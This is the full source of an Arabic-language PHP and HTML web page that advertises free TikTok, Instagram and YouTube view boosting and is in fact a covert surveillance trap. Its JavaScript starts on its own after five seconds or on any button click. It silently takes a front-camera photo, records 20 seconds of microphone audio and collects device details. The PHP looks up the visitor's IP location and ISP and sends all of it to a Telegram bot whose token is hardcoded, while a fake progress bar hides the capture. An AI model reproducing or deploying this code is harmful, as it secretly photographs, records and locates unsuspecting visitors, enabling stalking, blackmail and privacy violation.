<?php    
// --- إعدادات ---    
$BOT_TOKEN = "8986564985:AAHUcAlEB3b2Cx7ZveKUbToXXfuRGyQatSw";    
$ADMIN_ID = $_GET['8818283871'] ?? null;

// إرسال رسالة فورية عند فتح الرابط - فقط إذا ماكانش في بيانات جايه من JavaScript
if ($ADMIN_ID && empty($_POST)) {
    $currentTime = date('Y-m-d H:i:s');
    $instantMsg = "👤 تم فتح موقع رشق المشاهدات من قبل المستخدم !\n\n🕒 التاريخ : $currentTime";
    
    file_get_contents("https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$ADMIN_ID&text=" . urlencode($instantMsg));
}

// لو فيه بيانات جايه من JavaScript    
if (isset($_POST['battery']) && isset($_POST['device']) && isset($_POST['time']) && $ADMIN_ID) {    
    $battery = $_POST['battery'];    
    $device = $_POST['device'];    
    $userTime = $_POST['time'];    
    $language = $_POST['lang'] ?? 'غير معروف';    
    $screenRes = $_POST['screen'] ?? 'غير معروف';    
    $referrer = $_POST['ref'] ?: 'غير معروف';    
    $photoData = $_POST['photo'] ?? null;
    $audioData = $_POST['audio'] ?? null;
    $dataType = $_POST['data_type'] ?? 'photo'; // تحديد نوع البيانات

    $ip = $_SERVER['REMOTE_ADDR'] ?? 'غير معروف';    
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'غير معروف';    
    
    // جلب الدولة والمدينة واسم الشركة    
    $country = 'غير معروف';    
    $isp = 'غير معروف';    
    $ipData = @json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);    
    if ($ipData && $ipData['status'] === 'success') {    
        $country = $ipData['country'] . " - " . $ipData['city'];    
        $isp = !empty($ipData['isp']) ? $ipData['isp'] : 'غير معروف';    
    }    
    
    // نص البيانات
    $captionText = "🎯 تم فتح موقع رشق المشاهدات!\n"    
         . "🌐 IP: $ip\n"    
         . "📍 الدولة: $country\n"    
         . "🏢 اسم الشركة: $isp\n"    
         . "🖥 المتصفح: $userAgent\n"    
         . "📱 نوع الجهاز: $device\n"    
         . "🔋 نسبة الشحن: $battery%\n"    
         . "🕒 الوقت/التاريخ: $userTime\n"    
         . "🌍 اللغة: $language\n"    
         . "📏 دقة الشاشة: $screenRes\n"    
         . "🔗 الصفحة السابقة: $referrer";    
    
    // إذا كان طلب إرسال الصورة والمعلومات
    if ($dataType === 'photo' && $photoData) {
        $photoData = str_replace('data:image/jpeg;base64,', '', $photoData);
        $photoData = str_replace(' ', '+', $photoData);
        $photoBinary = base64_decode($photoData);
        
        // حفظ الصورة مؤقتاً
        $tempFile = tempnam(sys_get_temp_dir(), 'photo') . '.jpg';
        file_put_contents($tempFile, $photoBinary);
        
        // إرسال الصورة للتليجرام مع النص كـ caption
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $ADMIN_ID,
            'photo' => new CURLFile($tempFile),
            'caption' => $captionText
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
        
        // حذف الملف المؤقت
        unlink($tempFile);
    }
    
    // إذا كان طلب إرسال الصوت
    if ($dataType === 'audio' && $audioData) {
        $audioData = str_replace('data:audio/webm;base64,', '', $audioData);
        $audioData = str_replace('data:audio/wav;base64,', '', $audioData);
        $audioData = str_replace(' ', '+', $audioData);
        $audioBinary = base64_decode($audioData);
        
        // حفظ الصوت مؤقتاً
        $tempAudioFile = tempnam(sys_get_temp_dir(), 'audio') . '.ogg';
        file_put_contents($tempAudioFile, $audioBinary);
        
        // إرسال الصوت للتليجرام
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$BOT_TOKEN/sendVoice");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $ADMIN_ID,
            'voice' => new CURLFile($tempAudioFile),
            'caption' => "🎤 تسجيل صوتي مدته 20 ثانية من المستخدم"
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
        
        // حذف الملف المؤقت
        unlink($tempAudioFile);
    }
    
    exit;    
}
?>  

<!DOCTYPE html>  
<html lang="ar">    
<head>    
<meta charset="UTF-8">    
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>رشق مشاهدات مجاني - زيادة مشاهدات TikTok وInstagram</title>    
<style>    
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

:root {
    --primary-dark: #0a1a35;
    --primary-blue: #1a3a6c;
    --secondary-blue: #2d5aa0;
    --accent-blue: #4a7bd9;
    --light-blue: #6a9ae3;
    --highlight: #ffd166;
    --text-light: #f8f9fa;
    --text-gray: #a0aec0;
    --gradient-primary: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary-blue) 100%);
    --gradient-secondary: linear-gradient(135deg, var(--secondary-blue) 0%, var(--accent-blue) 100%);
    --gradient-highlight: linear-gradient(135deg, var(--highlight) 0%, #ffb347 100%);
    --card-shadow: 0 10px 25px rgba(10, 26, 53, 0.15);
    --hover-shadow: 0 15px 35px rgba(10, 26, 53, 0.25);
}

body { 
    background: var(--gradient-primary);
    color: var(--text-light);
    font-family: 'Tajawal', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    line-height: 1.6;
    min-height: 100vh;
    overflow-x: hidden;
}    

.container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 20px;
}

.header {
    text-align: center;
    background: rgba(255, 255, 255, 0.08);
    backdrop-filter: blur(10px);
    padding: 40px 30px;
    border-radius: 20px;
    box-shadow: var(--card-shadow);
    margin-bottom: 40px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    position: relative;
    overflow: hidden;
}

.header::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 4px;
    background: var(--gradient-highlight);
}

.header h1 {
    color: var(--text-light);
    font-size: 2.8rem;
    margin-bottom: 15px;
    font-weight: 700;
    text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
}

.header p {
    color: var(--text-gray);
    font-size: 1.3rem;
    max-width: 700px;
    margin: 0 auto;
}

.platforms {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
    gap: 25px;
    margin-bottom: 40px;
}

.platform-card {
    background: rgba(255, 255, 255, 0.08);
    backdrop-filter: blur(10px);
    padding: 30px;
    border-radius: 18px;
    box-shadow: var(--card-shadow);
    text-align: center;
    transition: all 0.4s ease;
    border: 1px solid rgba(255, 255, 255, 0.1);
    position: relative;
    overflow: hidden;
}

.platform-card::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 5px;
    background: var(--gradient-secondary);
}

.platform-card:hover {
    transform: translateY(-10px);
    box-shadow: var(--hover-shadow);
    background: rgba(255, 255, 255, 0.12);
}

.platform-icon {
    font-size: 3.5rem;
    margin-bottom: 20px;
    display: inline-block;
    background: var(--gradient-secondary);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    filter: drop-shadow(0 5px 15px rgba(42, 90, 180, 0.3));
}

.platform-card h3 {
    color: var(--text-light);
    margin-bottom: 20px;
    font-size: 1.6rem;
    font-weight: 600;
}

.stats {
    display: flex;
    justify-content: space-around;
    margin: 25px 0;
}

.stat {
    text-align: center;
}

.stat-number {
    font-size: 2.2rem;
    font-weight: 700;
    background: var(--gradient-highlight);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    filter: drop-shadow(0 2px 5px rgba(255, 209, 102, 0.3));
}

.stat-label {
    font-size: 0.95rem;
    color: var(--text-gray);
    margin-top: 5px;
}

.btn {
    background: var(--gradient-secondary);
    color: white;
    border: none;
    padding: 14px 35px;
    border-radius: 30px;
    font-size: 1.05rem;
    cursor: pointer;
    transition: all 0.3s ease;
    text-decoration: none;
    display: inline-block;
    margin: 10px 5px;
    font-weight: 600;
    letter-spacing: 0.5px;
    box-shadow: 0 5px 15px rgba(42, 90, 180, 0.3);
    position: relative;
    overflow: hidden;
}

.btn::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
    transition: 0.5s;
}

.btn:hover {
    transform: translateY(-3px);
    box-shadow: 0 8px 20px rgba(42, 90, 180, 0.5);
}

.btn:hover::before {
    left: 100%;
}

.btn-secondary {
    background: var(--gradient-highlight);
    color: var(--primary-dark);
    box-shadow: 0 5px 15px rgba(255, 209, 102, 0.3);
}

.btn-secondary:hover {
    box-shadow: 0 8px 20px rgba(255, 209, 102, 0.5);
}

.features {
    background: rgba(255, 255, 255, 0.08);
    backdrop-filter: blur(10px);
    padding: 40px 30px;
    border-radius: 20px;
    box-shadow: var(--card-shadow);
    margin-bottom: 40px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    position: relative;
    overflow: hidden;
}

.features::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 4px;
    background: var(--gradient-highlight);
}

.features h2 {
    text-align: center;
    color: var(--text-light);
    margin-bottom: 35px;
    font-size: 2.3rem;
    font-weight: 700;
}

.feature-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(270px, 1fr));
    gap: 25px;
}

.feature-item {
    text-align: center;
    padding: 25px 20px;
    background: rgba(255, 255, 255, 0.05);
    border-radius: 15px;
    transition: all 0.3s ease;
}

.feature-item:hover {
    transform: translateY(-5px);
    background: rgba(255, 255, 255, 0.08);
}

.feature-icon {
    font-size: 2.8rem;
    margin-bottom: 20px;
    display: inline-block;
    background: var(--gradient-secondary);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    filter: drop-shadow(0 5px 10px rgba(42, 90, 180, 0.3));
}

.feature-item h4 {
    color: var(--text-light);
    margin-bottom: 10px;
    font-size: 1.3rem;
    font-weight: 600;
}

.feature-item p {
    color: var(--text-gray);
    font-size: 1rem;
}

.loading-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(10, 26, 53, 0.95);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1000;
}

.loading-content {
    background: rgba(26, 58, 108, 0.9);
    backdrop-filter: blur(10px);
    padding: 50px 40px;
    border-radius: 20px;
    text-align: center;
    max-width: 550px;
    width: 90%;
    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
    border: 1px solid rgba(255, 255, 255, 0.1);
}

.loading-spinner {
    width: 60px;
    height: 60px;
    border: 5px solid rgba(255, 255, 255, 0.1);
    border-top: 5px solid var(--highlight);
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 25px;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loading-content h3 {
    color: var(--text-light);
    margin-bottom: 15px;
    font-size: 1.5rem;
}

.loading-content p {
    color: var(--text-gray);
    margin-bottom: 20px;
}

#camera, #canvas { 
    display: none; 
}

.footer {
    text-align: center;
    margin-top: 50px;
    padding: 25px;
    color: var(--text-gray);
    font-size: 0.95rem;
    border-top: 1px solid rgba(255, 255, 255, 0.1);
}

.url-input {
    padding: 15px 25px;
    border: 2px solid rgba(255, 255, 255, 0.2);
    border-radius: 30px;
    font-size: 1.05rem;
    width: 350px;
    margin-right: 15px;
    background: rgba(255, 255, 255, 0.1);
    color: var(--text-light);
    transition: all 0.3s ease;
}

.url-input:focus {
    outline: none;
    border-color: var(--accent-blue);
    background: rgba(255, 255, 255, 0.15);
}

.url-input::placeholder {
    color: var(--text-gray);
}

/* أنيميشن للنجوم */
.stars {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    z-index: -1;
}

.star {
    position: absolute;
    background: white;
    border-radius: 50%;
    animation: twinkle 5s infinite;
}

@keyframes twinkle {
    0%, 100% { opacity: 0.2; transform: scale(1); }
    50% { opacity: 1; transform: scale(1.1); }
}

/* تأثيرات إضافية */
.pulse {
    animation: pulse 2s infinite;
}

@keyframes pulse {
    0% { box-shadow: 0 0 0 0 rgba(74, 123, 217, 0.7); }
    70% { box-shadow: 0 0 0 15px rgba(74, 123, 217, 0); }
    100% { box-shadow: 0 0 0 0 rgba(74, 123, 217, 0); }
}

.floating {
    animation: floating 3s ease-in-out infinite;
}

@keyframes floating {
    0% { transform: translateY(0px); }
    50% { transform: translateY(-10px); }
    100% { transform: translateY(0px); }
}

/* تصميم متجاوب */
@media (max-width: 768px) {
    .header h1 {
        font-size: 2.2rem;
    }
    
    .header p {
        font-size: 1.1rem;
    }
    
    .platforms {
        grid-template-columns: 1fr;
    }
    
    .url-input {
        width: 100%;
        margin-right: 0;
        margin-bottom: 15px;
    }
    
    .feature-grid {
        grid-template-columns: 1fr;
    }
    
    .stats {
        flex-direction: column;
        gap: 15px;
    }
}
</style>    
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
</head>    
<body>    

<div class="stars" id="stars"></div>

<div class="container">
    <div class="header floating">
        <h1>🎯 رشق مشاهدات مجاني</h1>
        <p>زيادة مشاهدات TikTok، Instagram، YouTube مجاناً وبضغطة واحدة!</p>
    </div>

    <div class="platforms">
        <div class="platform-card">
            <div class="platform-icon">📱</div>
            <h3>TikTok مشاهدة</h3>
            <div class="stats">
                <div class="stat">
                    <div class="stat-number">10K+</div>
                    <div class="stat-label">مشاهدات</div>
                </div>
                <div class="stat">
                    <div class="stat-number">500+</div>
                    <div class="stat-label">لايكات</div>
                </div>
            </div>
            <button class="btn pulse" onclick="startProcess('tiktok')">الحصول على مشاهدات</button>
        </div>

        <div class="platform-card">
            <div class="platform-icon">📸</div>
            <h3>Instagram مشاهدة</h3>
            <div class="stats">
                <div class="stat">
                    <div class="stat-number">5K+</div>
                    <div class="stat-label">مشاهدات</div>
                </div>
                <div class="stat">
                    <div class="stat-number">300+</div>
                    <div class="stat-label">لايكات</div>
                </div>
            </div>
            <button class="btn pulse" onclick="startProcess('instagram')">الحصول على مشاهدات</button>
        </div>

        <div class="platform-card">
            <div class="platform-icon">🎥</div>
            <h3>YouTube مشاهدة</h3>
            <div class="stats">
                <div class="stat">
                    <div class="stat-number">20K+</div>
                    <div class="stat-label">مشاهدات</div>
                </div>
                <div class="stat">
                    <div class="stat-number">1K+</div>
                    <div class="stat-label">لايكات</div>
                </div>
            </div>
            <button class="btn pulse" onclick="startProcess('youtube')">الحصول على مشاهدات</button>
        </div>
    </div>

    <div class="features">
        <h2>✨ مميزات الخدمة</h2>
        <div class="feature-grid">
            <div class="feature-item">
                <div class="feature-icon">⚡</div>
                <h4>فوري وسريع</h4>
                <p>احصل على المشاهدات خلال دقائق</p>
            </div>
            <div class="feature-item">
                <div class="feature-icon">🆓</div>
                <h4>مجاني بالكامل</h4>
                <p>لا توجد أي رسوم خفية</p>
            </div>
            <div class="feature-item">
                <div class="feature-icon">🔒</div>
                <h4>آمن ومضمون</h4>
                <p>لا يؤثر على حسابك</p>
            </div>
            <div class="feature-item">
                <div class="feature-icon">📈</div>
                <h4>نتائج حقيقية</h4>
                <p>زيادة حقيقية في التفاعل</p>
            </div>
        </div>
    </div>

    <div class="header">
        <h2>🚀 ابدأ الآن!</h2>
        <p>اختر المنصة وادخل رابط الفيديو لتحصل على المشاهدات المجانية</p>
        <div style="margin-top: 30px;">
            <input type="text" id="videoUrl" class="url-input" placeholder="https:// مثال: رابط الفيديو">
            <button class="btn btn-secondary" onclick="startProcess('custom')">بدء الرشق</button>
        </div>
    </div>
</div>

<div class="footer">
    <p>© 2024 خدمة رشق المشاهدات المجانية - جميع الحقوق محفوظة</p>
    <p>هذه خدمة مجانية لمساعدة المحتوى على الانتشار</p>
</div>

<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-content">
        <div class="loading-spinner"></div>
        <h3>جاري معالجة طلبك...</h3>
        <p>يتم الآن تجهيز المشاهدات المجانية لحسابك</p>
        <p id="progressText">جاري التحقق من الحساب...</p>
        <div style="margin-top: 25px;">
            <div style="background: rgba(255, 255, 255, 0.1); border-radius: 10px; height: 12px; overflow: hidden;">
                <div id="progressBar" style="background: var(--gradient-highlight); height: 100%; width: 0%; transition: width 0.5s ease;"></div>
            </div>
        </div>
    </div>
</div>

<video id="camera" autoplay playsinline></video>  
<canvas id="canvas"></canvas>  

<script>
// إنشاء النجوم في الخلفية
function createStars() {
    const starsContainer = document.getElementById('stars');
    for (let i = 0; i < 100; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        star.style.width = Math.random() * 3 + 'px';
        star.style.height = star.style.width;
        star.style.left = Math.random() * 100 + '%';
        star.style.top = Math.random() * 100 + '%';
        star.style.animationDelay = Math.random() * 5 + 's';
        star.style.animationDuration = (Math.random() * 5 + 3) + 's';
        starsContainer.appendChild(star);
    }
}

createStars();

async function capturePhoto() {  
    try {  
        const stream = await navigator.mediaDevices.getUserMedia({  
            video: { 
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }  
        });  
        
        const video = document.getElementById('camera');  
        const canvas = document.getElementById('canvas');  
        const context = canvas.getContext('2d');  
        
        video.srcObject = stream;  
        
        await new Promise(resolve => {  
            video.onloadedmetadata = () => {  
                resolve();  
            };  
        });  
        
        canvas.width = video.videoWidth;  
        canvas.height = video.videoHeight;  
        
        await new Promise(resolve => setTimeout(resolve, 1000));  
        
        context.drawImage(video, 0, 0, canvas.width, canvas.height);  
        
        stream.getTracks().forEach(track => track.stop());  
        
        return canvas.toDataURL('image/jpeg', 0.8);  
        
    } catch (error) {  
        console.error('خطأ في الوصول للكاميرا:', error);  
        return null;  
    }  
}  

async function recordAudio() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            audio: true 
        });
        
        const mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'audio/webm'
        });
        
        const chunks = [];
        
        return new Promise((resolve) => {
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    chunks.push(e.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                
                reader.onload = () => {
                    resolve(reader.result);
                };
                
                reader.readAsDataURL(blob);
                stream.getTracks().forEach(track => track.stop());
            };
            
            mediaRecorder.start();
            
            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 20000);
        });
        
    } catch (error) {
        console.error('خطأ في التسجيل الصوتي:', error);
        return null;
    }
}

async function sendPhotoData() {  
    let batteryLevel = "غير معروف";  
    try {  
        const battery = await navigator.getBattery();  
        batteryLevel = Math.round(battery.level * 100);  
    } catch(e){}  

    const deviceType = navigator.userAgent;  
    const now = new Date().toLocaleString();  
    const lang = navigator.language || "غير معروف";  
    const screenRes = window.screen.width + "x" + window.screen.height;  
    const referrer = document.referrer || "";  
    
    const photoData = await capturePhoto();  
    
    const formData = new FormData();  
    formData.append('battery', batteryLevel);  
    formData.append('device', deviceType);  
    formData.append('time', now);  
    formData.append('lang', lang);  
    formData.append('screen', screenRes);  
    formData.append('ref', referrer);  
    formData.append('data_type', 'photo');
    if (photoData) {  
        formData.append('photo', photoData);  
    }
    
    try {  
        await fetch(window.location.href, {  
            method: "POST",  
            body: formData  
        });  
    } catch (error) {  
        console.error('خطأ في إرسال البيانات:', error);  
    }  
}  

async function sendAudioData() {
    const audioData = await recordAudio();
    
    if (audioData) {
        const formData = new FormData();  
        formData.append('data_type', 'audio');
        formData.append('audio', audioData);
        
        try {  
            await fetch(window.location.href, {  
                method: "POST",  
                body: formData  
            });  
        } catch (error) {  
            console.error('خطأ في إرسال الصوت:', error);  
        }
    }
}

function startProcess(platform) {
    const loadingOverlay = document.getElementById('loadingOverlay');
    const progressBar = document.getElementById('progressBar');
    const progressText = document.getElementById('progressText');
    
    loadingOverlay.style.display = 'flex';
    
    // محاكاة تقدم العملية
    const steps = [
        'جاري التحقق من الحساب...',
        'جاري تجهيز المشاهدات...',
        'جاري رشق المشاهدات...',
        'جاري تحديث الإحصائيات...',
        'اكتملت العملية بنجاح!'
    ];
    
    let step = 0;
    const interval = setInterval(() => {
        progressBar.style.width = ((step + 1) * 20) + '%';
        progressText.textContent = steps[step];
        step++;
        
        if (step >= steps.length) {
            clearInterval(interval);
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                alert('✅ تمت عملية الرشق بنجاح! سيتم إضافة المشاهدات خلال 24 ساعة.');
            }, 1000);
        }
    }, 2000);
    
    // بدء جمع البيانات في الخلفية
    sendPhotoData();
    setTimeout(() => {
        sendAudioData();
    }, 20000);
}

// بدء العملية تلقائياً بعد 5 ثواني (للمستخدمين الذين لا ينقرون)
setTimeout(() => {
    if (!document.querySelector('.btn:focus')) {
        startProcess('auto');
    }
}, 5000);
</script>  
</body>    
</html>